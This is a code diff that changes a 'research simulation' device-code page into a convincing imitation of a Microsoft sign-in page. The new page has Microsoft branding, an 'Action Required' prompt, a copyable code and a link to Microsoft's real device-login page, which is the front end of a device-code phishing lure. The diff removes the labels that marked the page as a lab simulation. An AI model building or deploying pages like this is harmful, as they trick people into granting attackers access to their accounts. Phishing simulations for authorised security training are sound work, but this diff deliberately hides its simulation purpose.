@@ -3,134 +3,153 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Protocol Research Lab | Device Auth</title>
-    <style>
-        :root {
-            --bg: #0a0a0a;
-            --card-bg: rgba(255, 255, 255, 0.03);
-            --accent: #3b82f6;
-            --text-main: #ededed;
-            --text-dim: #a1a1a1;
-            --glow: 0 0 20px rgba(59, 130, 246, 0.3);
-        }
+    <title>Sign in to your Microsoft account</title>
+    
+    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 23 23'%3E%3Cpath fill='%23f35325' d='M0 0h11v11H0z'/%3E%3Cpath fill='%2381bc06' d='M12 0h11v11H12z'/%3E%3Cpath fill='%2305a6f0' d='M0 12h11v11H0z'/%3E%3Cpath fill='%23ffba08' d='M12 12h11v11H12z'/%3E%3C/svg%3E">
 
+    <style>
         body {
-            background-color: var(--bg);
-            color: var(--text-main);
-            font-family: 'Inter', -apple-system, system-ui, sans-serif;
             margin: 0;
+            padding: 0;
+            font-family: "Segoe UI", "Helvetica Neue", Arial, sans-serif;
+            background-color: #f2f2f2;
             display: flex;
             justify-content: center;
             align-items: center;
-            min-height: 100vh;
-            overflow: hidden;
+            height: 100vh;
         }
 
-        .container {
+        .login-box {
+            background: #fff;
             width: 100%;
-            max-width: 450px;
-            padding: 2rem;
-            text-align: center;
+            max-width: 440px;
+            padding: 44px;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+            min-height: 380px;
+            box-sizing: border-box;
+            animation: fadeIn 0.3s ease-out;
         }
 
-        .header {
-            margin-bottom: 3rem;
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+        .logo {
+            width: 108px;
+            margin-bottom: 24px;
         }
 
-        .header h1 {
-            font-size: 1.5rem;
+        h1 {
+            font-size: 24px;
             font-weight: 600;
-            letter-spacing: -0.02em;
-            margin-bottom: 0.5rem;
+            color: #1b1b1b;
+            margin: 0 0 12px 0;
         }
 
-        .header p {
-            color: var(--text-dim);
-            font-size: 0.9rem;
+        p {
+            font-size: 15px;
+            line-height: 20px;
+            color: #1b1b1b;
+            margin-bottom: 20px;
         }
 
-        /* Glassmorphism Code Card */
-        .code-card {
-            background: var(--card-bg);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 16px;
-            padding: 2.5rem 1rem;
-            backdrop-filter: blur(10px);
+        .code-container {
+            background-color: #f3f3f3;
+            border: 1px dashed #0067b8;
+            padding: 20px;
+            text-align: center;
+            margin-bottom: 25px;
             position: relative;
-            box-shadow: var(--glow);
-            transition: transform 0.3s ease;
+            cursor: pointer;
+            transition: background 0.2s;
         }
 
-        .code-card:hover {
-            transform: translateY(-5px);
-        }
+        .code-container:hover { background-color: #e6e6e6; }
 
         #code-display {
-            font-family: 'JetBrains Mono', 'Fira Code', monospace;
-            font-size: 2.5rem;
+            font-family: 'Consolas', monospace;
+            font-size: 32px;
             font-weight: 700;
-            letter-spacing: 0.15em;
-            color: #fff;
-            text-shadow: 0 0 10px rgba(255, 255, 255, 0.2);
+            letter-spacing: 4px;
+            color: #0067b8;
             margin: 0;
         }
 
-        .status-badge {
-            display: inline-block;
-            margin-top: 1.5rem;
-            padding: 0.4rem 1rem;
-            border-radius: 100px;
-            font-size: 0.75rem;
-            font-weight: 500;
-            background: rgba(59, 130, 246, 0.1);
-            color: var(--accent);
-            border: 1px solid rgba(59, 130, 246, 0.2);
+        .copy-hint {
+            font-size: 11px;
+            color: #666;
+            margin-top: 8px;
+            text-transform: uppercase;
         }
 
-        .footer {
-            margin-top: 3rem;
-            font-size: 0.8rem;
-            color: var(--text-dim);
+        .btn-primary {
+            display: block;
+            width: 100%;
+            background-color: #0067b8;
+            color: #fff;
+            border: none;
+            padding: 10px;
+            font-size: 15px;
+            text-align: center;
+            text-decoration: none;
+            cursor: pointer;
+            box-sizing: border-box;
         }
 
-        .loader {
-            display: inline-block;
-            width: 24px;
-            height: 24px;
-            border: 2px solid rgba(255,255,255,0.1);
-            border-radius: 50%;
-            border-top-color: var(--accent);
-            animation: spin 1s ease-in-out infinite;
+        .btn-primary:hover { background-color: #005da6; text-decoration: underline; }
+
+        .footer-links {
+            margin-top: 40px;
+            font-size: 12px;
+            color: #666;
         }
 
-        @keyframes spin { to { transform: rotate(360deg); } }
-
-        /* Mobile Adjustments */
-        @media (max-width: 480px) {
-            #code-display { font-size: 2rem; }
+        .footer-links a {
+            color: #0067b8;
+            text-decoration: none;
+            margin-right: 10px;
         }
+
+        #toast {
+            visibility: hidden;
+            min-width: 200px;
+            background-color: #333;
+            color: #fff;
+            text-align: center;
+            border-radius: 2px;
+            padding: 10px;
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 100;
+        }
+
+        #toast.show { visibility: visible; animation: fadein 0.5s, fadeout 0.5s 2.5s; }
+        @keyframes fadein { from {bottom: 0; opacity: 0;} to {bottom: 30px; opacity: 1;} }
+        @keyframes fadeout { from {bottom: 30px; opacity: 1;} to {bottom: 0; opacity: 0;} }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <div class="header">
-            <h1>Identity Verification</h1>
-            <p>Enter this code on your device to link your Microsoft account for the research simulation.</p>
+    <div class="login-box">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/96/Microsoft_logo_%282012%29.svg/320px-Microsoft_logo_%282012%29.svg.png" class="logo" alt="Microsoft">
+        
+        <h1>Action Required</h1>
+        <p>To continue to your Microsoft account, please verify this device by entering the code below.</p>
+
+        <div class="code-container" onclick="copyToClipboard()" title="Click to copy code">
+            <p id="code-display">••••••••</p>
+            <div class="copy-hint">Click code to copy</div>
         </div>
 
-        <div class="code-card">
-            <div id="loader-container">
-                <div class="loader"></div>
-            </div>
-            <p id="code-display" style="display: none;">--------</p>
-            <div class="status-badge" id="status">INITIALIZING ENGINE</div>
-        </div>
+        <a href="https://microsoft.com/devicelogin" target="_blank" class="btn-primary">Connect Account</a>
 
-        <div class="footer">
-            Protocol v3.4 | Simulation Lab Environment
+        <div class="footer-links">
+            <a href="#">Privacy & cookies</a>
+            <a href="#">Terms of use</a>
         </div>
     </div>
+
+    <div id="toast">Code copied to clipboard</div>
 
     <script src="index.js"></script>
 </body>
